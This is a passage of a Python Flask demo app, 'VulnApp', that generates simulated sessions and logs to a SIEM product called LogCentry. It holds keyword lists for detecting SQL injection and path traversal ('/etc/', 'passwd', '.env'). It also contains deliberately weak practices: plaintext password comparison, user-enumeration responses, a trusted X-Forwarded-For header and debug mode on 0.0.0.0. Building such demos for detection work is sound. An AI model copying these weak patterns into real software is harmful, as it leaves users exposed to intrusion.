    user = gen.random_username()
    ip = gen.internal_ip()
    actions = []
    
    # Login
    logger.info(f"User '{user}' logged in", source="auth", ip=ip, user=user, status="success")
    actions.append("login")
    
    # Browse pages
    for _ in range(random.randint(3, 7)):
        page = random.choice(["/dashboard", "/profile", "/settings", "/reports", "/help"])
        logger.info(f"Page view: {page}", source="web", ip=ip, user=user, path=page)
        actions.append(f"view:{page}")
        time.sleep(0.03)
    
    # Perform action
    action = random.choice(["update_profile", "download_report", "change_settings"])
    logger.info(f"Action: {action}", source="api", ip=ip, user=user, action=action)
    actions.append(action)
    
    # Logout
    logger.info(f"User '{user}' logged out", source="auth", ip=ip, user=user, status="logout")
    actions.append("logout")
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "user": user,
        "actions": len(actions),
        "session_actions": actions
    })


# ==================== Legacy Endpoints (kept for compatibility) ====================

@app.route("/api/login", methods=["POST"])
def login():
    """Vulnerable login endpoint."""
    data = request.get_json() or {}
    username = data.get("username", "")
    password = data.get("password", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    if username in USERS:
        if USERS[username] == password:
            logger.info(f"Successful login for user '{username}'", source="auth", ip=ip, user=username, status="success")
            return jsonify({"status": "success", "message": "Login successful"})
        else:
            logger.warning(f"Failed login attempt for user '{username}'", source="auth", ip=ip, user=username, status="failed", reason="invalid_password")
            return jsonify({"status": "failed", "message": "Invalid password"}), 401
    else:
        logger.security(f"Login attempt for non-existent user '{username}'", source="auth", ip=ip, user=username, status="failed", reason="user_not_found")
        return jsonify({"status": "failed", "message": "User not found"}), 404


@app.route("/api/users")
def get_user():
    """Vulnerable user lookup."""
    user_id = request.args.get("id", "1")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")
    
    sqli_patterns = ["'", '"', "OR", "UNION", "SELECT", "DROP", "INSERT", "--", ";"]
    is_sqli = any(p.lower() in user_id.lower() for p in sqli_patterns)
    
    if is_sqli:
        logger.security(f"SQL Injection attempt detected: {user_id[:100]}", source="api", ip=ip, path="/api/users", payload=user_id[:200], user_agent=user_agent[:100], attack_type="sqli")
        return jsonify({"error": "Invalid input detected", "status": "blocked"}), 400
    
    logger.info(f"User lookup: id={user_id}", source="api", ip=ip)
    return jsonify({"id": user_id, "name": f"User {user_id}", "status": "ok"})


@app.route("/api/files")
def get_file():
    """Vulnerable file access."""
    filename = request.args.get("name", "readme.txt")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")
    
    traversal_patterns = ["..", "/etc/", "/var/", "passwd", ".git", ".env", "config"]
    is_traversal = any(p in filename.lower() for p in traversal_patterns)
    
    if is_traversal:
        logger.security(f"Path traversal attempt: {filename}", source="api", ip=ip, path="/api/files", filename=filename, user_agent=user_agent[:100], attack_type="path_traversal")
        return jsonify({"error": "Access denied", "status": "blocked"}), 403
    
    logger.info(f"File access: {filename}", source="api", ip=ip)
    return jsonify({"filename": filename, "content": "Demo content", "status": "ok"})


if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("🔓 VulnApp Demo - LogCentry Feature Showcase")
    print("=" * 60)
    print(f"📡 Sending logs to: {LOGCENTRY_ENDPOINT}")
    print("🌐 Demo app: http://localhost:5000")
    print(f"📊 LogCentry Dashboard: {LOGCENTRY_ENDPOINT}/dashboard")
    print("=" * 60)
    print("Features:")
    print("  ✨ Dynamic data generation (no hardcoded logs)")
    print("  🛡️ SIEM correlation & alerts")
    print("  🤖 AI threat analysis")
    print("  🎬 Comprehensive demo workflow")
    print("=" * 60 + "\n")
    
    logger.info("VulnApp demo started", source="system", version="2.0.0", features=["dynamic_data", "siem", "ai_analysis"])
    
    app.run(host="0.0.0.0", port=5000, debug=True)
